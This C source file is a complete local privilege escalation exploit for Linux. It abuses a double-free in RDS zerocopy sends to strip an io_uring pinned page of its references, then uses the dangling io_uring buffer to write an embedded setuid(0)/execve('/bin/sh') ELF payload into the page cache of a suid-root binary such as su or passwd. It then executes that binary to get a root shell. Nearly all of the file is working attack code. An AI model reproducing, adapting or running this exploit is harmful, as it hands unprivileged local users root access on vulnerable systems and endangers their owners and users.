/*
 * RDS zcopy double-free -> LPE via io_uring page cache overwrite
 *
 * Bug: rds_message_zcopy_from_user() pins user pages via GUP (FOLL_GET) one
 * at a time. If a later page faults, the error path put_page()s the already
 * pinned pages, then rds_message_purge() __free_page()s them again because
 * op_mmp_znotifier was NULLed but op_nents/sg entries were left intact. When
 * the page still has other references, __free_page silently decrements the
 * refcount. Each failing sendmsg steals exactly one ref from the first page.
 *
 * On kernels with CONFIG_INIT_ON_ALLOC_DEFAULT_ON (which enables the
 * check_pages static key), __free_pages_prepare will see nonzero memcg_data
 * on a charged page and call bad_page(). init_on_alloc also zeros every
 * newly allocated page, destroying any payload placed before allocation.
 *
 * We bypass both. Pin the target page via io_uring REGISTER_BUFFERS, which
 * adds GUP_PIN_COUNTING_BIAS (1024) to the refcount through FOLL_PIN. Steal
 * all 1024 pin refs with failing zcopy sends. The page refcount is now ~1
 * (just the PTE mapping). munmap takes the normal __folio_put path, which
 * calls mem_cgroup_uncharge (clearing memcg_data) before freeing. No
 * bad_page check fires. Page freed cleanly to PCP.
 *
 * io_uring keeps the raw struct page* in its bvec array with no liveness
 * checks. After the page is reclaimed as page cache for a suid binary,
 * READ_FIXED writes our payload into it through that dangling pointer. The
 * write lands after init_on_alloc zeroing and after the fs populates the
 * page from disk, so the payload survives.
 *
 * Closing ring1 would normally unpin the buffer (folio_put_refs with 1024),
 * corrupting whatever page now lives at that frame. We prevent this with
 * IORING_REGISTER_CLONE_BUFFERS: cloning to a second ring increments
 * imu->refs. io_buffer_unmap sees refs > 1 and returns without unpinning.
 * A forked daemon child holds the clone ring fd open indefinitely.
 *
 * PCP is LIFO, so we pin to one CPU and drain stale entries before freeing,
 * putting our page at the top when the page cache allocator grabs it.
 *
 * Chain: register(+1024) -> clone(refs=2) -> daemon holds clone -> steal
 * 1024 refs -> evict target page cache -> drain PCP -> munmap(free) ->
 * pread target(reclaim) -> READ_FIXED(overwrite) -> verify -> exec -> root
 *
 * Requires CONFIG_RDS, CONFIG_RDS_TCP (auto-loaded via SO_RDS_TRANSPORT=2
 * since the zcopy path checks t_type == RDS_TRANS_TCP), CONFIG_IO_URING
 * with io_uring_disabled=0, and a readable suid-root binary. No capabilities
 * needed. x86_64 payload, technique is arch-independent.
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <arpa/inet.h>
#include <linux/io_uring.h>
#include <linux/rds.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>

#define PAGE_SIZE 4096
#define GUP_PIN_COUNTING_BIAS 1024
#define PORT_BASE 20000
#define MAX_RETRIES 5

static const uint8_t SHELL_ELF[129] = {
    0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x03,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x38,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x81,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x81,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0xb0,0x69,0x0f,0x05,0x48,0x8d,
    0x3d,0xdb,0xff,0xff,0xff,0x6a,0x00,0x57,0x48,0x89,0xe6,0x31,0xd2,0xb0,0x3b,0x0f,
    0x05,
};

static const char *suid_candidates[] = {
    "/usr/bin/su",
    "/bin/su",
    "/usr/bin/mount",
    "/usr/bin/passwd",
    "/usr/bin/chsh",
    "/usr/bin/newgrp",
    "/usr/bin/umount",
    "/usr/bin/pkexec",
    "/mnt/suid_helper",
    NULL,
};

#define ANSI_RESET  "\033[0m"
#define ANSI_BOLD   "\033[1m"
#define ANSI_RED    "\033[1;31m"
#define ANSI_GREEN  "\033[1;32m"
#define ANSI_YELLOW "\033[1;33m"
#define ANSI_CYAN   "\033[1;36m"
#define ANSI_WHITE  "\033[1;37m"

#define LOG(fmt, ...) fprintf(stderr, ANSI_CYAN  "[*]" ANSI_RESET " " fmt "\n", ##__VA_ARGS__)
#define ERR(fmt, ...) fprintf(stderr, ANSI_RED   "[-]" ANSI_RESET " " fmt "\n", ##__VA_ARGS__)
#define OK(fmt, ...)  fprintf(stderr, ANSI_GREEN  "[+]" ANSI_RESET " " fmt "\n", ##__VA_ARGS__)

/*
 * draw_page_chain — visualise the 3-node handle→pointer→page relationship.
 *
 *  [io_uring bvec]  ──arr──▶  [struct page *]  ──arr──▶  [page state]
 *
 * c1/c3:  ANSI color for the left/right boxes.
 * carr/arr: ANSI color + exactly 11-display-column arrow string.
 * tag1:   ≤18 chars, status label for the bvec box.
 * l3a/l3b: ≤22 chars each, two content lines for the page-state box.
 */
static void draw_page_chain(
    const char *c1,   const char *tag1,
    const char *carr, const char *arr,
    const char *c3,   const char *l3a, const char *l3b)
{
    fprintf(stderr, "\n"
        /* top borders */
        "  %s┌────────────────────┐%s               "
          "┌──────────────────────┐               "
          "%s┌──────────────────────────┐%s\n"
        /* content row 1: arrow lives here */
        "  %s│  io_uring bvec     │%s  %s%s%s  "
          "│  struct page *       │  %s%s%s  "
          "%s│  %-22.22s  │%s\n"
        /* content row 2 */
        "  %s│  %-18.18s│%s               "
          "│  (kernel vaddr)      │               "
          "%s│  %-22.22s  │%s\n"
        /* bottom borders */
        "  %s└────────────────────┘%s               "
          "└──────────────────────┘               "
          "%s└──────────────────────────┘%s\n\n",
        c1, ANSI_RESET, c3, ANSI_RESET,
        c1, ANSI_RESET, carr, arr, ANSI_RESET, carr, arr, ANSI_RESET, c3, l3a, ANSI_RESET,
        c1, tag1, ANSI_RESET, c3, l3b, ANSI_RESET,
        c1, ANSI_RESET, c3, ANSI_RESET);
}

static void hexdump(const char *label, const void *data, size_t len) {
    const uint8_t *p = data;
    if (label)
        fprintf(stderr, ANSI_CYAN "[*]" ANSI_RESET " %s (%zu bytes):\n", label, len);
    for (size_t i = 0; i < len; i += 16) {
        fprintf(stderr, ANSI_CYAN "  %04zx:" ANSI_RESET "  ", i);
        for (size_t j = 0; j < 16; j++) {
            if (i + j < len)
                fprintf(stderr, ANSI_YELLOW "%02x " ANSI_RESET, p[i + j]);
            else
                fprintf(stderr, "   ");
            if (j == 7) fprintf(stderr, " ");
        }
        fprintf(stderr, " " ANSI_GREEN "|");
        for (size_t j = 0; j < 16 && i + j < len; j++) {
            uint8_t c = p[i + j];
            fprintf(stderr, "%c", (c >= 0x20 && c < 0x7f) ? c : '.');
        }
        fprintf(stderr, "|" ANSI_RESET "\n");
    }
    fprintf(stderr, "\n");
}

static void pin_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) < 0) {
        perror("sched_setaffinity");
        exit(1);
    }
}

static const char *find_suid_target(void) {
    for (int i = 0; suid_candidates[i]; i++) {
        struct stat st;
        if (stat(suid_candidates[i], &st) == 0 && (st.st_mode & S_ISUID)) {
            OK("found suid target: %s", suid_candidates[i]);
            return suid_candidates[i];
        }
    }
    return NULL;
}

static int backup_target(const char *path) {
    const char *name = strrchr(path, '/');
    name = name ? name + 1 : path;
    char backup[256];
    snprintf(backup, sizeof(backup), "/tmp/.backup_%s_%d", name, getpid());
    LOG("backing up %s → %s", path, backup);

    int src = open(path, O_RDONLY);
    if (src < 0) { perror("open src"); return -1; }
    int dst = open(backup, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (dst < 0) { perror("open dst"); close(src); return -1; }

    char tmp[4096];
    ssize_t n;
    while ((n = read(src, tmp, sizeof(tmp))) > 0) {
        if (write(dst, tmp, n) != n) { perror("write"); close(src); close(dst); return -1; }
    }
    close(src);
    close(dst);
    OK("backup created: %s", backup);
    return 0;
}

static int steal_one_ref(void *page_addr, int port) {
    int fd = socket(AF_RDS, SOCK_SEQPACKET, 0);
    if (fd < 0) return -1;

    int v = 1;
    setsockopt(fd, SOL_SOCKET, SO_ZEROCOPY, &v, sizeof(v));
    int sndbuf = 2 * 4096 * 4;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    v = 2;
    setsockopt(fd, SOL_RDS, SO_RDS_TRANSPORT, &v, sizeof(v));

    struct sockaddr_in a = {
        .sin_family = AF_INET,
        .sin_addr.s_addr = htonl(INADDR_LOOPBACK),
        .sin_port = htons(port),
    };
    if (bind(fd, (struct sockaddr *)&a, sizeof(a)) < 0) {
        close(fd);
        return -1;
    }

    a.sin_port = htons(port + 1);
    struct iovec iov = { page_addr, 2 * PAGE_SIZE };

    char cb[CMSG_SPACE(sizeof(uint32_t))];
    memset(cb, 0, sizeof(cb));
    struct cmsghdr *cm = (struct cmsghdr *)cb;
    cm->cmsg_level = SOL_RDS;
    cm->cmsg_type = RDS_CMSG_ZCOPY_COOKIE;
    cm->cmsg_len = CMSG_LEN(sizeof(uint32_t));

    struct msghdr m = {
        .msg_name = &a,
        .msg_namelen = sizeof(a),
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = cb,
        .msg_controllen = sizeof(cb),
    };
    sendmsg(fd, &m, MSG_ZEROCOPY | MSG_DONTWAIT);
    close(fd);
    return 0;
}

struct uring {
    int fd;
    void *sq_ring;
    void *cq_ring;
    struct io_uring_sqe *sqes;
    uint32_t *sq_head;
    uint32_t *sq_tail;
    uint32_t *sq_mask;
    uint32_t *sq_array;
    uint32_t *cq_head;
    uint32_t *cq_tail;
    uint32_t *cq_mask;
    struct io_uring_cqe *cqes;
    size_t sq_ring_sz;
    size_t cq_ring_sz;
    size_t sqes_sz;
};

static int uring_setup(struct uring *r, unsigned entries) {
    struct io_uring_params p;
    memset(&p, 0, sizeof(p));

    r->fd = syscall(__NR_io_uring_setup, entries, &p);
    if (r->fd < 0) {
        perror("io_uring_setup");
        return -1;
    }

    r->sq_ring_sz = p.sq_off.array + p.sq_entries * sizeof(uint32_t);
    r->cq_ring_sz = p.cq_off.cqes + p.cq_entries * sizeof(struct io_uring_cqe);
    r->sqes_sz = p.sq_entries * sizeof(struct io_uring_sqe);

    r->sq_ring = mmap(NULL, r->sq_ring_sz, PROT_READ | PROT_WRITE,
                       MAP_SHARED | MAP_POPULATE, r->fd, IORING_OFF_SQ_RING);
    if (r->sq_ring == MAP_FAILED) { perror("mmap sq_ring"); return -1; }

    r->cq_ring = mmap(NULL, r->cq_ring_sz, PROT_READ | PROT_WRITE,
                       MAP_SHARED | MAP_POPULATE, r->fd, IORING_OFF_CQ_RING);
    if (r->cq_ring == MAP_FAILED) { perror("mmap cq_ring"); return -1; }

    r->sqes = mmap(NULL, r->sqes_sz, PROT_READ | PROT_WRITE,
                    MAP_SHARED | MAP_POPULATE, r->fd, IORING_OFF_SQES);
    if (r->sqes == MAP_FAILED) { perror("mmap sqes"); return -1; }

    r->sq_head  = r->sq_ring + p.sq_off.head;
    r->sq_tail  = r->sq_ring + p.sq_off.tail;
    r->sq_mask  = r->sq_ring + p.sq_off.ring_mask;
    r->sq_array = r->sq_ring + p.sq_off.array;
    r->cq_head  = r->cq_ring + p.cq_off.head;
    r->cq_tail  = r->cq_ring + p.cq_off.tail;
    r->cq_mask  = r->cq_ring + p.cq_off.ring_mask;
    r->cqes     = r->cq_ring + p.cq_off.cqes;

    fprintf(stderr,
        ANSI_CYAN "[*]" ANSI_RESET " io_uring ring ready:\n"
        ANSI_CYAN "      fd"         ANSI_RESET " = " ANSI_YELLOW "%d\n"       ANSI_RESET
        ANSI_CYAN "      sq_entries" ANSI_RESET " = " ANSI_YELLOW "%u"         ANSI_RESET
        "  sq_ring @ " ANSI_WHITE "%p" ANSI_RESET "  (sz " ANSI_YELLOW "0x%zx" ANSI_RESET ")\n"
        ANSI_CYAN "      cq_entries" ANSI_RESET " = " ANSI_YELLOW "%u"         ANSI_RESET
        "  cq_ring @ " ANSI_WHITE "%p" ANSI_RESET "  (sz " ANSI_YELLOW "0x%zx" ANSI_RESET ")\n"
        ANSI_CYAN "      sqes"       ANSI_RESET "       @ " ANSI_WHITE "%p"    ANSI_RESET
        "  (sz " ANSI_YELLOW "0x%zx" ANSI_RESET ", each " ANSI_YELLOW "0x%zx" ANSI_RESET " bytes)\n",
        r->fd,
        p.sq_entries, r->sq_ring, r->sq_ring_sz,
        p.cq_entries, r->cq_ring, r->cq_ring_sz,
        r->sqes, r->sqes_sz, sizeof(struct io_uring_sqe));

    return 0;
}

static int uring_register_buffers(struct uring *r, void *buf, size_t len) {
    struct iovec iov = { .iov_base = buf, .iov_len = len };
    int ret = syscall(__NR_io_uring_register, r->fd,
                      IORING_REGISTER_BUFFERS, &iov, 1);
    if (ret < 0) {
        perror("io_uring_register buffers");
        return -1;
    }
    return 0;
}

static int uring_clone_buffers(struct uring *dst, struct uring *src) {
    struct io_uring_clone_buffers arg;
    memset(&arg, 0, sizeof(arg));
    arg.src_fd = src->fd;
    arg.flags = 0;
    arg.nr = 0; /* clone all */
    int ret = syscall(__NR_io_uring_register, dst->fd,
                      IORING_REGISTER_CLONE_BUFFERS, &arg, 1);
    if (ret < 0) {
        perror("io_uring clone buffers");
        return -1;
    }
    return 0;
}

/*
 * Fork a daemon child that holds ring2_fd open, preventing imu cleanup.
 * When ring1 is destroyed, io_buffer_unmap sees imu->refs > 1 and skips
 * the unpin_user_folio call that would corrupt the freed page's refcount.
 */
static pid_t spawn_ring_holder(int ring2_fd) {
    pid_t pid = fork();
    if (pid != 0) return pid; /* parent */
    /* child: hold ring2_fd open forever */
    /* clear CLOEXEC so execl doesn't close it */
    fcntl(ring2_fd, F_SETFD, 0);
    /* close everything else */
    for (int fd = 0; fd < 1024; fd++)
        if (fd != ring2_fd) close(fd);
    /* become a daemon — just sleep */
    open("/dev/null", O_RDONLY); /* fd 0 */
    open("/dev/null", O_WRONLY); /* fd 1 */
    open("/dev/null", O_WRONLY); /* fd 2 */
    execl("/bin/sleep", "sleep", "99999", (char *)NULL);
    _exit(0);
}

static int uring_submit_read_fixed(struct uring *r, int file_fd,
                                    void *buf, uint32_t len) {
    uint32_t tail = *r->sq_tail;
    uint32_t idx = tail & *r->sq_mask;

    struct io_uring_sqe *sqe = &r->sqes[idx];
    memset(sqe, 0, sizeof(*sqe));
    sqe->opcode = IORING_OP_READ_FIXED;
    sqe->fd = file_fd;
    sqe->off = 0;
    sqe->addr = (uint64_t)(unsigned long)buf;
    sqe->len = len;
    sqe->buf_index = 0;
    sqe->user_data = 0x1234;

    fprintf(stderr,
        ANSI_CYAN "[*]" ANSI_RESET " SQE[" ANSI_YELLOW "%u" ANSI_RESET "] "
        ANSI_WHITE "IORING_OP_READ_FIXED" ANSI_RESET ":\n"
        "       fd        = " ANSI_YELLOW "%d\n"          ANSI_RESET
        "       addr      = " ANSI_WHITE  "0x%016llx\n"   ANSI_RESET
        "       len       = " ANSI_YELLOW "0x%x"          ANSI_RESET " (%u bytes)\n"
        "       buf_index = " ANSI_YELLOW "%u\n"          ANSI_RESET
        "       off       = " ANSI_YELLOW "0x%llx\n"      ANSI_RESET
        "       user_data = " ANSI_WHITE  "0x%llx\n"      ANSI_RESET,
        idx, file_fd,
        (unsigned long long)sqe->addr,
        sqe->len, sqe->len,
        (unsigned)sqe->buf_index,
        (unsigned long long)sqe->off,
        (unsigned long long)sqe->user_data);

    r->sq_array[idx] = idx;
    __atomic_store_n(r->sq_tail, tail + 1, __ATOMIC_RELEASE);

    int ret = syscall(__NR_io_uring_enter, r->fd, 1, 1,
                      IORING_ENTER_GETEVENTS, NULL, (size_t)0);
    if (ret < 0) {
        perror("io_uring_enter");
        return -1;
    }
    return 0;
}

static int uring_wait_cqe(struct uring *r, int32_t *res_out) {
    uint32_t head = *r->cq_head;
    uint32_t tail;

    for (int i = 0; i < 1000; i++) {
        tail = __atomic_load_n(r->cq_tail, __ATOMIC_ACQUIRE);
        if (head != tail) break;
        usleep(1000);
    }
    tail = __atomic_load_n(r->cq_tail, __ATOMIC_ACQUIRE);
    if (head == tail) {
        ERR("CQ timeout — no completion");
        return -1;
    }

    uint32_t idx = head & *r->cq_mask;
    struct io_uring_cqe *cqe = &r->cqes[idx];
    if (res_out) *res_out = cqe->res;
    __atomic_store_n(r->cq_head, head + 1, __ATOMIC_RELEASE);
    return 0;
}

static void uring_destroy(struct uring *r) {
    if (r->sq_ring != MAP_FAILED) munmap(r->sq_ring, r->sq_ring_sz);
    if (r->cq_ring != MAP_FAILED) munmap(r->cq_ring, r->cq_ring_sz);
    if (r->sqes != MAP_FAILED) munmap(r->sqes, r->sqes_sz);
    if (r->fd >= 0) close(r->fd);
    r->fd = -1;
}

static int create_payload_file(void) {
    char path[] = "/tmp/.payload_XXXXXX";
    int fd = mkstemp(path);
    if (fd < 0) { perror("mkstemp"); return -1; }
    unlink(path);

    uint8_t page[PAGE_SIZE];
    memset(page, 0, sizeof(page));
    memcpy(page, SHELL_ELF, sizeof(SHELL_ELF));

    if (write(fd, page, PAGE_SIZE) != PAGE_SIZE) {
        perror("write payload");
        close(fd);
        return -1;
    }
    return fd;
}

static int evict_page_cache(const char *path) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) { perror("open for fadvise"); return -1; }
    if (posix_fadvise(fd, 0, PAGE_SIZE, POSIX_FADV_DONTNEED) < 0) {
        perror("fadvise");
        close(fd);
        return -1;
    }
    close(fd);
    return 0;
}

static int attempt_exploit(const char *target, pid_t *daemon_out) {
    LOG("=== starting exploit attempt ===");

    /* 1. mmap anon page + PROT_NONE guard */
    void *buf = mmap(NULL, 2 * PAGE_SIZE, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (buf == MAP_FAILED) { perror("mmap buf"); return -1; }

    /* touch the page to ensure it's faulted in */
    memset(buf, 'A', PAGE_SIZE);

    /* set second page as PROT_NONE guard */
    if (mprotect((char *)buf + PAGE_SIZE, PAGE_SIZE, PROT_NONE) < 0) {
        perror("mprotect guard");
        munmap(buf, 2 * PAGE_SIZE);
        return -1;
    }
    OK("mapped buf=%p, guard at %p", buf, (char *)buf + PAGE_SIZE);
    fprintf(stderr,
        ANSI_WHITE "  ┌─ page @ " ANSI_YELLOW "%p" ANSI_WHITE
        "  refcount:" ANSI_GREEN " 1" ANSI_WHITE " (PTE only)" ANSI_RESET "\n\n", buf);

    /* 2. io_uring setup + register buffer (pins page, refcount += 1024) */
    struct uring ring;
    memset(&ring, 0, sizeof(ring));
    ring.fd = -1;
    ring.sq_ring = MAP_FAILED;
    ring.cq_ring = MAP_FAILED;
    ring.sqes = MAP_FAILED;

    if (uring_setup(&ring, 4) < 0) {
        munmap(buf, 2 * PAGE_SIZE);
        return -1;
    }
    if (uring_register_buffers(&ring, buf, PAGE_SIZE) < 0) {
        uring_destroy(&ring);
        munmap(buf, 2 * PAGE_SIZE);
        return -1;
    }
    OK("io_uring buffer registered (refcount now ~1025)");
    draw_page_chain(
        ANSI_GREEN,  "REGISTERED (+1024)",
        ANSI_WHITE,  "──────────▶",
        ANSI_GREEN,  "anon page", "refcnt:1025  FOLL_PIN");

    /* 2b. Clone buffers to ring2 + spawn daemon to hold imu ref */
    struct uring ring2;
    memset(&ring2, 0, sizeof(ring2));
    ring2.fd = -1;
    ring2.sq_ring = MAP_FAILED;
    ring2.cq_ring = MAP_FAILED;
    ring2.sqes = MAP_FAILED;
    if (uring_setup(&ring2, 1) < 0) {
        uring_destroy(&ring);
        munmap(buf, 2 * PAGE_SIZE);
        return -1;
    }
    if (uring_clone_buffers(&ring2, &ring) < 0) {
        uring_destroy(&ring2);
        uring_destroy(&ring);
        munmap(buf, 2 * PAGE_SIZE);
        return -1;
    }
    OK("cloned buffers to ring2 (imu->refs now 2)");
    fprintf(stderr,
        ANSI_WHITE "  ├─ IORING_REGISTER_CLONE_BUFFERS → imu->refs:" ANSI_GREEN " 2\n"
        "  └─ ring2 fd will block io_buffer_unmap from calling unpin_user_folio" ANSI_RESET "\n\n");
    pid_t daemon = spawn_ring_holder(ring2.fd);
    if (daemon < 0) {
        uring_destroy(&ring2);
        uring_destroy(&ring);
        munmap(buf, 2 * PAGE_SIZE);
        return -1;
    }
    /* parent closes ring2 — daemon holds the only ref to ring2 */
    uring_destroy(&ring2);
    OK("daemon pid=%d holds ring2 (prevents unpin on ring1 cleanup)", daemon);
    *daemon_out = daemon;

    /* 3. steal 1024 refs via failing zcopy sends */
    LOG("stealing %d refcounts...", GUP_PIN_COUNTING_BIAS);
    int stolen = 0;
    for (int i = 0; i < GUP_PIN_COUNTING_BIAS; i++) {
        int port = PORT_BASE + i * 2;
        int ret = steal_one_ref(buf, port);
        if (ret < 0) {
            /* port in use or RDS unavailable, skip */
            continue;
        }
        stolen++;
        if (stolen % 256 == 0)
            LOG("  stolen %d/%d refs", stolen, GUP_PIN_COUNTING_BIAS);
    }
    OK("stole %d refcounts (refcount now ~1)", stolen);
    draw_page_chain(
        ANSI_YELLOW, "refs stolen (1024)",
        ANSI_YELLOW, "──────────▶",
        ANSI_YELLOW, "anon page", "refcnt:~1  pin gone");

    if (stolen < GUP_PIN_COUNTING_BIAS) {
        ERR("only stole %d/%d refs — may not be enough",
            stolen, GUP_PIN_COUNTING_BIAS);
        if (stolen < GUP_PIN_COUNTING_BIAS - 10) {
            ERR("too few stolen refs, aborting");
            uring_destroy(&ring);
            munmap(buf, 2 * PAGE_SIZE);
            return -1;
        }
    }

    /* 4. evict suid binary from page cache BEFORE freeing our page */
    LOG("evicting %s page 0 from page cache...", target);
    if (evict_page_cache(target) < 0) {
        ERR("failed to evict page cache");
        uring_destroy(&ring);
        return -1;
    }
    OK("page cache evicted");


    /* 6. drain PCP: allocate many pages to push stale entries out */
    LOG("draining PCP...");
    void *drain_pages[256];
    for (int i = 0; i < 256; i++) {
        drain_pages[i] = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                              MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    }

    /* 7. munmap first page → refcount 1→0 → freed to TOP of PCP (LIFO) */
    LOG("unmapping buf to trigger free (refcount 1 -> 0)...");
    if (munmap(buf, PAGE_SIZE) < 0) {
        perror("munmap buf");
        uring_destroy(&ring);
        return -1;
    }
    OK("page freed to top of PCP — io_uring retains dangling struct page*");
    draw_page_chain(
        ANSI_RED,    "DANGLING! (bvec)",
        ANSI_RED,    "─X────────▶",
        ANSI_RED,    "FREED  (PCP top)", "refcnt:0  PTE gone");

    /* 8. IMMEDIATELY read suid binary → page cache alloc grabs from PCP top */
    LOG("reading %s to reclaim freed page into page cache...", target);
    int tfd = open(target, O_RDONLY);
    if (tfd < 0) { perror("open target"); uring_destroy(&ring); return -1; }
    /* no fadvise — let the kernel do default readahead */
    uint8_t verify_buf[PAGE_SIZE];
    if (pread(tfd, verify_buf, PAGE_SIZE, 0) < 0) {
        perror("pread target"); close(tfd); uring_destroy(&ring); return -1;
    }
    close(tfd);
    OK("page cache populated");
    {
        char pcache_label[24];
        const char *bn = strrchr(target, '/');
        snprintf(pcache_label, sizeof(pcache_label), "%.18s  pg0", bn ? bn + 1 : target);
        draw_page_chain(
            ANSI_RED,    "DANGLING! (bvec)",
            ANSI_RED,    "──────────▶",
            ANSI_YELLOW, "page cache (live!)", pcache_label);
    }

    /* snapshot legitimate page content before we overwrite it */
    uint8_t before_buf[64] = {0};
    {
        int snap = open(target, O_RDONLY);
        if (snap >= 0) {
            pread(snap, before_buf, sizeof(before_buf), 0);
            close(snap);
        }
    }
    hexdump("page cache page 0 BEFORE overwrite (legitimate ELF)", before_buf, sizeof(before_buf));

    /* clean up drain pages AFTER page cache allocation */
    for (int i = 0; i < 256; i++)
        if (drain_pages[i] != MAP_FAILED) munmap(drain_pages[i], PAGE_SIZE);

    /* create payload file AFTER page cache allocation */
    int payload_fd = create_payload_file();
    if (payload_fd < 0) {
        uring_destroy(&ring);
        return -1;
    }

    /* 9. READ_FIXED: DMA writes payload into page cache via dangling page */
    LOG("submitting IORING_OP_READ_FIXED to overwrite page cache...");
    if (uring_submit_read_fixed(&ring, payload_fd, buf, PAGE_SIZE) < 0) {
        close(payload_fd);
        uring_destroy(&ring);
        return -1;
    }

    int32_t cqe_res;
    if (uring_wait_cqe(&ring, &cqe_res) < 0) {
        close(payload_fd);
        uring_destroy(&ring);
        return -1;
    }
    close(payload_fd);

    if (cqe_res < 0) {
        ERR("READ_FIXED CQE error: %d (%s)", cqe_res, strerror(-cqe_res));
        uring_destroy(&ring);
        return -1;
    }
    OK("READ_FIXED completed: %d bytes written via DMA", cqe_res);
    draw_page_chain(
        ANSI_RED,    "UAF WRITE (bvec)",
        ANSI_RED,    "══DMA═════▶",
        ANSI_RED,    "PAGE CACHE PWNED", "our shellcode  \\o/");

    /* 9. verify overwrite */
    LOG("verifying page cache overwrite...");
    tfd = open(target, O_RDONLY);
    if (tfd < 0) {
        perror("open target for verify");
        uring_destroy(&ring);
        return -1;
    }
    uint8_t check[sizeof(SHELL_ELF)];
    if (pread(tfd, check, sizeof(check), 0) != sizeof(check)) {
        perror("pread verify");
        close(tfd);
        uring_destroy(&ring);
        return -1;
    }
    close(tfd);

    hexdump("page cache page 0 AFTER overwrite (our shellcode)", check, sizeof(SHELL_ELF));
    if (memcmp(check, SHELL_ELF, sizeof(SHELL_ELF)) != 0) {
        int first_diff = -1;
        for (int i = 0; i < (int)sizeof(SHELL_ELF); i++) {
            if (check[i] != SHELL_ELF[i]) { first_diff = i; break; }
        }
        ERR("verification FAILED \u2014 first mismatch at byte %d", first_diff);
        if (first_diff >= 0) {
            ERR("  expected[%d]: %02x  got[%d]: %02x",
                first_diff, SHELL_ELF[first_diff], first_diff, check[first_diff]);
            ERR("  page cache page 0 was NOT overwritten \u2014 io_uring wrote to wrong page");
        }
        uring_destroy(&ring);
        return -1;
    }
    OK("verification PASSED — page cache overwritten with SHELL_ELF");

    /* With clone fix, uring_destroy is safe — imu->refs > 1 skips unpin */
    uring_destroy(&ring);

    /* 10. exec suid binary → root shell */
    OK("executing %s (now contains setuid(0) + execve /bin/sh)...", target);
    fprintf(stderr, "\n");
    fprintf(stderr,
            ANSI_YELLOW ANSI_BOLD
            "=== RESTORE: sudo cp /tmp/.backup_%s_%d %s && sudo chmod u+s %s ==="
            ANSI_RESET "\n",
            strrchr(target, '/') + 1, getpid(), target, target);
    fflush(stderr);

    /* close all fds > 2 EXCEPT ring fd doesn't matter, execl replaces us */
    for (int fd = 3; fd < 1024; fd++) close(fd);

    execl(target, target, (char *)NULL);
    perror("execl");
    return -1;
}

int main(void) {
    pin_cpu(0);
    LOG("pinned to CPU 0");

    const char *target = find_suid_target();
    if (!target) {
        ERR("no suid binary found");
        return 1;
    }

    if (backup_target(target) < 0) {
        ERR("backup failed, aborting for safety");
        return 1;
    }

    pid_t daemons[MAX_RETRIES];
    int ndaemons = 0;

    for (int attempt = 0; attempt < MAX_RETRIES; attempt++) {
        LOG("attempt %d/%d", attempt + 1, MAX_RETRIES);
        pid_t daemon = 0;
        int ret = attempt_exploit(target, &daemon);
        if (daemon > 0)
            daemons[ndaemons++] = daemon;
        if (ret == 0)
            return 0; /* attempt_exploit exec'd */
        ERR("attempt %d failed, retrying...", attempt + 1);
        sleep(1);
    }

    /* all attempts failed; kill accumulated daemons */
    for (int i = 0; i < ndaemons; i++) {
        kill(daemons[i], SIGKILL);
        waitpid(daemons[i], NULL, 0);
    }
    ERR("all %d attempts failed", MAX_RETRIES);
    return 1;
}
